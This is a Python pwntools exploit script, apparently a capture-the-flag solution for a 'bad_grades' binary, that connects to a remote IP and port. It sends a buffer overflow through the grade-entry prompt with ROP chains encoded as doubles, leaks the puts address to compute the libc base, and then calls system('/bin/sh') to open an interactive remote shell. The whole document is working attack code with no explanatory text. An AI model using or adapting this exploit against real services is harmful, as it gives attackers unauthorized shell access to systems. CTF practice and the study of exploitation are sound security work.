#!/usr/bin/env python3

from pwn import *
from sys import argv
import struct

prog = ELF("bad_grades_patched")
libc = ELF("libc.so.6")

RET_OFFSET = 35
GRADES_FN = 0x400fd5

if __name__ == "__main__":
    if len(argv) < 2:
        print("Usage: writup.py IP:PORT")
        exit(1)
    context.binary = prog
    IP, PORT = argv[1].split(':')

    rop = ROP(prog.path)
    rop.puts(prog.got['puts'])
    rop.call(GRADES_FN)
    warn('Rop to leak libc_base:')
    print(rop.dump())
    payload = bytes(rop)
    libc_base = None
    with remote(IP, PORT) as run:
        run.sendlineafter(b'> ', b'2')
        run.sendlineafter(b': ', bytes(str(RET_OFFSET + len(payload) // 8), 'utf-8'))
        for _ in range(RET_OFFSET):
            run.sendlineafter(b': ', b'.')
        for i in range(0, len(payload), 8):
            run.sendlineafter(b': ', bytes(str(struct.unpack('d', payload[i:i+8])[0]), 'utf-8'))
        run.recvline()

        libc_base = unpack(run.recvn(6).ljust(8, b'\x00')) - libc.sym['puts']
        libc_system = libc_base + libc.sym['system']
        libc_bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

        info(f'libc_base = {hex(libc_base)}')
        info(f'libc_system = {hex(libc_system)}')
        info(f'libc_bin_sh = {hex(libc_bin_sh)}')
        
        rop = ROP(prog)
        rop.call(rop.ret)
        rop.call(libc_system, [libc_bin_sh])
        rop.exit(42)

        warn('Rop to pop a shell:')
        print(rop.dump())
        payload = bytes(rop)

        run.sendlineafter(b': ', bytes(str(RET_OFFSET + len(payload) // 8), 'utf-8'))
        for _ in range(RET_OFFSET):
            run.sendlineafter(b': ', b'.')
        #gdb.attach(run)
        for i in range(0, len(payload), 8):
            run.sendlineafter(b': ', bytes(str(struct.unpack('d', payload[i:i+8])[0]), 'utf-8'))
        run.recvline()

        run.interactive()
